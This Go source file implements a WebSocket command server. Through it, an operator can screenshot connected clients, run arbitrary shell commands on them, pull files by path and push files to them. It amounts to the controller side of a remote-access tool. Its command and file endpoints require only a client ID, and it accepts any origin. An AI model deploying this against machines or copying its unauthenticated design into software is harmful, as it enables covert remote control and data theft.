package main

import (
	"database/sql"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
)

var upgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

type CommandRequest struct {
	Command string `json:"command"`
}

// 新增：线程安全的连接结构体
type SafeConn struct {
	Conn       *websocket.Conn
	WriteMutex sync.Mutex
}

var (
	responseChannels  = make(map[string]chan []byte)
	respMutex         sync.Mutex
	activeConnections = make(map[string]*SafeConn) // 使用ID作为key，线程安全
	connMutex         sync.Mutex
	secretKey         string
	db                *sql.DB
)

func main() {
	port := flag.String("port", "8080", "服务器监听端口")
	key := flag.String("key", "", "认证密钥")
	dbPath := flag.String("db", "conn_log.db", "数据库文件路径")
	flag.Parse()

	secretKey = *key
	/* if err := os.MkdirAll("screenshots", 0755); err != nil {
		log.Fatal("创建目录失败:", err)
	} */

	// 初始化sqlite数据库
	var err error
	db, err = sql.Open("sqlite3", *dbPath)
	if err != nil {
		log.Fatalf("无法打开数据库: %v", err)
	}
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS conn_log (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		client_id TEXT,
		event TEXT,
		remote_ip TEXT,
		time TEXT DEFAULT (strftime('%Y-%m-%d %H:%M:%S', 'now', 'localtime'))
	)`)
	if err != nil {
		log.Fatalf("创建表失败: %v", err)
	}

	http.HandleFunc("/ws", wsHandler)
	http.HandleFunc("/capture", triggerCaptureHandler)
	http.HandleFunc("/execute", executeCommandHandler)
	http.HandleFunc("/file", getFileHandler)
	http.HandleFunc("/upload", uploadFileHandler)

	server := &http.Server{
		Addr:         ":" + *port,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
	}

	log.Printf("服务端启动，监听 :%s", *port)
	log.Fatal(server.ListenAndServe())
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("连接升级失败:", err)
		return
	}
	defer conn.Close()

	// 从查询参数获取客户端ID
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		log.Println("客户端未提供ID")
		return
	}

	remoteIP := r.RemoteAddr
	logConnectionEvent(clientID, "connect", remoteIP) // 记录连接日志

	// 将连接添加到活跃连接列表
	connMutex.Lock()
	activeConnections[clientID] = &SafeConn{Conn: conn}
	connMutex.Unlock()

	// 确保连接关闭时从列表中移除
	defer func() {
		connMutex.Lock()
		delete(activeConnections, clientID)
		connMutex.Unlock()

		// 清理可能残留的响应通道
		respMutex.Lock()
		if ch, exists := responseChannels[clientID]; exists {
			close(ch) // 关闭通道（防止协程泄漏）
			delete(responseChannels, clientID)
		}
		respMutex.Unlock()
		logConnectionEvent(clientID, "disconnect", remoteIP) // 记录断开日志
	}()

	log.Printf("客户端接入: %s (ID: %s)", r.RemoteAddr, clientID)

	// 心跳 goroutine
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			connMutex.Lock()
			safeConn, exists := activeConnections[clientID]
			connMutex.Unlock()
			if !exists {
				return
			}
			safeConn.WriteMutex.Lock()
			err := safeConn.Conn.WriteMessage(websocket.PingMessage, nil)
			safeConn.WriteMutex.Unlock()
			if err != nil {
				log.Printf("心跳检测失败 (%s): %v", clientID, err)
				safeConn.Conn.Close()
				break
			}
		}
	}()

	for {
		msgType, data, err := conn.ReadMessage()
		if err != nil {
			log.Printf("接收数据异常 (%s): %v", clientID, err)
			break
		}

		if msgType == websocket.BinaryMessage {
			//saveScreenshot(clientID, data)
			respMutex.Lock()
			if ch, exists := responseChannels[clientID]; exists {
				select {
				case ch <- data: // 非阻塞发送
					log.Printf("截图已发送 (%.2fKB)", float64(len(data))/1024)
				default:
					log.Printf("通道已满或关闭 (%s)", clientID)
				}
				delete(responseChannels, clientID) // 立即删除
			}
			respMutex.Unlock()
		} else if msgType == websocket.TextMessage {
			// 新增：处理命令回显
			respMutex.Lock()
			if ch, exists := responseChannels[clientID]; exists {
				select {
				case ch <- data:
					log.Printf("命令回显已发送 (%dB)", len(data))
				default:
					log.Printf("命令回显通道已满或关闭 (%s)", clientID)
				}
				delete(responseChannels, clientID)
			}
			respMutex.Unlock()
		}
	}
}

func saveScreenshot(clientID string, data []byte) {
	// filename := "screenshots/" + clientID + "_" + time.Now().Format("20060102-150405") + ".jpg"
	filename := "screenshots/" + clientID + ".jpg"
	if err := os.WriteFile(filename, data, 0644); err != nil {
		log.Println("文件保存失败:", err)
	} else {
		log.Printf("截图已保存: %s (%.2fKB)", filename, float64(len(data))/1024)
	}
}

func triggerCaptureHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "ID parameter is required", http.StatusBadRequest)
		return
	}
	if secretKey != "" && clientID == secretKey {
		// 获取所有连接的客户端ID
		connMutex.Lock()
		ids := make([]string, 0, len(activeConnections))
		for id := range activeConnections {
			ids = append(ids, id)
		}
		connMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization") // 添加 Authorization
		json.NewEncoder(w).Encode(ids)
		return
	}

	connMutex.Lock()
	safeConn, exists := activeConnections[clientID]
	connMutex.Unlock()

	if !exists {
		http.Error(w, "No active connection for this ID", http.StatusNotFound)
		return
	}

	// 1. 创建响应通道
	respCh := make(chan []byte, 1)
	defer func() {
		// 确保通道关闭并从map中删除
		respMutex.Lock()
		delete(responseChannels, clientID)
		respMutex.Unlock()
		close(respCh) // 安全关闭
	}()

	// 2. 注册通道到全局map
	respMutex.Lock()
	responseChannels[clientID] = respCh
	respMutex.Unlock()

	// 写消息时加锁
	safeConn.WriteMutex.Lock()
	err := safeConn.Conn.WriteMessage(websocket.TextMessage, []byte(`{"action":"capture"}`))
	safeConn.WriteMutex.Unlock()
	if err != nil {
		log.Printf("指令发送失败 (%s): %v", clientID, err)
		connMutex.Lock()
		delete(activeConnections, clientID)
		connMutex.Unlock()
		http.Error(w, "Failed to send command", http.StatusInternalServerError)
		return
	}

	// 4. 等待响应或超时
	select {
	case data := <-respCh:
		w.Header().Set("Content-Type", "image/jpeg")
		w.Header().Set("Content-Length", strconv.Itoa(len(data)))
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Write(data)
		log.Printf("截图已发送 (%.2fKB)", float64(len(data))/1024)
	case <-time.After(2000 * time.Millisecond):
		http.Error(w, "等待截图超时", http.StatusGatewayTimeout)
	}
}

func executeCommandHandler(w http.ResponseWriter, r *http.Request) {
	log.Printf("收到 /execute 请求")
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "ID parameter is required", http.StatusBadRequest)
		return
	}

	if secretKey != "" && clientID == secretKey {
		// 获取所有连接的客户端ID
		connMutex.Lock()
		ids := make([]string, 0, len(activeConnections))
		for id := range activeConnections {
			ids = append(ids, id)
		}
		connMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(ids)
		return
	}

	// 解析请求体
	var cmdReq CommandRequest
	if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	log.Printf("收到客户端 %s 的命令: %s", clientID, cmdReq.Command)

	connMutex.Lock()
	safeConn, exists := activeConnections[clientID]
	connMutex.Unlock()

	if !exists {
		http.Error(w, "No active connection for this ID", http.StatusNotFound)
		return
	}

	// 创建响应通道
	respCh := make(chan []byte, 1)
	defer func() {
		respMutex.Lock()
		delete(responseChannels, clientID)
		respMutex.Unlock()
		close(respCh)
	}()

	// 注册通道
	respMutex.Lock()
	responseChannels[clientID] = respCh
	respMutex.Unlock()

	// 发送命令
	cmdMsg := map[string]string{
		"action":  "execute",
		"command": cmdReq.Command,
	}
	cmdBytes, _ := json.Marshal(cmdMsg)

	// 写消息时加锁
	safeConn.WriteMutex.Lock()
	err := safeConn.Conn.WriteMessage(websocket.TextMessage, cmdBytes)
	safeConn.WriteMutex.Unlock()
	if err != nil {
		log.Printf("命令发送失败 (%s): %v", clientID, err)
		http.Error(w, "Failed to send command", http.StatusInternalServerError)
		return
	}

	// 等待响应或超时
	select {
	case data := <-respCh:
		log.Printf("收到客户端 %s 的命令执行结果，长度: %d", clientID, len(data)) // 添加日志
		w.Header().Set("Content-Type", "text/plain")
		w.Write(data)
	case <-time.After(400 * time.Second):
		log.Printf("客户端 %s 命令执行超时", clientID)
		http.Error(w, "命令执行超时", http.StatusGatewayTimeout)
	}
}

func getFileHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "ID parameter is required", http.StatusBadRequest)
		return
	}

	if secretKey != "" && clientID == secretKey {
		// 获取所有连接的客户端ID
		connMutex.Lock()
		ids := make([]string, 0, len(activeConnections))
		for id := range activeConnections {
			ids = append(ids, id)
		}
		connMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		json.NewEncoder(w).Encode(ids)
		return
	}

	filePath := r.URL.Query().Get("path")
	if filePath == "" {
		http.Error(w, "Path parameter is required", http.StatusBadRequest)
		return
	}

	connMutex.Lock()
	safeConn, exists := activeConnections[clientID]
	connMutex.Unlock()

	if !exists {
		http.Error(w, "No active connection for this ID", http.StatusNotFound)
		return
	}

	// 创建响应通道
	respCh := make(chan []byte, 1)
	defer func() {
		respMutex.Lock()
		delete(responseChannels, clientID)
		respMutex.Unlock()
		close(respCh)
	}()

	// 注册通道
	respMutex.Lock()
	responseChannels[clientID] = respCh
	respMutex.Unlock()

	// 发送文件请求
	fileMsg := map[string]string{
		"action": "file",
		"path":   filePath,
	}
	fileBytes, _ := json.Marshal(fileMsg)

	// 写消息时加锁
	safeConn.WriteMutex.Lock()
	err := safeConn.Conn.WriteMessage(websocket.TextMessage, fileBytes)
	safeConn.WriteMutex.Unlock()
	if err != nil {
		log.Printf("文件请求发送失败 (%s): %v", clientID, err)
		http.Error(w, "Failed to send file request", http.StatusInternalServerError)
		return
	}

	// 等待响应或超时
	select {
	case data := <-respCh:
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.Itoa(len(data)))
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filepath.Base(filePath)))
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS, GET")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Write(data)
		log.Printf("文件已发送 (%.2fKB)", float64(len(data))/1024)
	case <-time.After(400 * time.Second):
		http.Error(w, "等待文件超时", http.StatusGatewayTimeout)
	}
}

func uploadFileHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "ID parameter is required", http.StatusBadRequest)
		return
	}

	// 增加文件大小限制到 100MB
	err := r.ParseMultipartForm(100 << 20)
	if err != nil {
		log.Printf("解析表单失败: %v", err)
		http.Error(w, fmt.Sprintf("Failed to parse form: %v", err), http.StatusBadRequest)
		return
	}

	file, header, err := r.FormFile("file")
	if err != nil {
		log.Printf("获取文件失败: %v", err)
		http.Error(w, fmt.Sprintf("Failed to get file: %v", err), http.StatusBadRequest)
		return
	}
	defer file.Close()

	// 读取文件内容
	fileData, err := io.ReadAll(file)
	if err != nil {
		log.Printf("读取文件失败: %v", err)
		http.Error(w, fmt.Sprintf("Failed to read file: %v", err), http.StatusInternalServerError)
		return
	}

	log.Printf("接收到文件: %s, 大小: %.2fMB", header.Filename, float64(len(fileData))/1024/1024)

	connMutex.Lock()
	safeConn, exists := activeConnections[clientID]
	connMutex.Unlock()

	if !exists {
		log.Printf("客户端 %s 不存在", clientID)
		http.Error(w, "No active connection for this ID", http.StatusNotFound)
		return
	}

	// 创建响应通道
	respCh := make(chan []byte, 1)
	defer func() {
		respMutex.Lock()
		delete(responseChannels, clientID)
		respMutex.Unlock()
		close(respCh)
	}()

	// 注册通道
	respMutex.Lock()
	responseChannels[clientID] = respCh
	respMutex.Unlock()

	// 发送文件上传请求
	uploadMsg := map[string]interface{}{
		"action": "upload",
		"name":   header.Filename,
		"data":   fileData,
	}
	uploadBytes, _ := json.Marshal(uploadMsg)

	// 写消息时加锁
	safeConn.WriteMutex.Lock()
	err = safeConn.Conn.WriteMessage(websocket.TextMessage, uploadBytes)
	safeConn.WriteMutex.Unlock()
	if err != nil {
		log.Printf("文件上传请求发送失败 (%s): %v", clientID, err)
		http.Error(w, "Failed to send upload request", http.StatusInternalServerError)
		return
	}

	// 等待响应或超时
	select {
	case data := <-respCh:
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		w.Write(data)
		log.Printf("文件上传完成: %s (%.2fKB)", header.Filename, float64(len(fileData))/1024)
	case <-time.After(400 * time.Second):
		http.Error(w, "文件上传超时", http.StatusGatewayTimeout)
	}
}

func logConnectionEvent(clientID, event, remoteIP string) {
	if db == nil {
		return
	}
	timeStr := time.Now().Format("2006-01-02 15:04:05")
	_, err := db.Exec("INSERT INTO conn_log (client_id, event, remote_ip, time) VALUES (?, ?, ?, ?)", clientID, event, remoteIP, timeStr)
	if err != nil {
		log.Printf("写入连接日志失败: %v", err)
	}
	// 保留最新1000条
	_, err = db.Exec(`DELETE FROM conn_log WHERE id NOT IN (SELECT id FROM conn_log ORDER BY id DESC LIMIT 1000)`)
	if err != nil {
		log.Printf("清理日志失败: %v", err)
	}
}
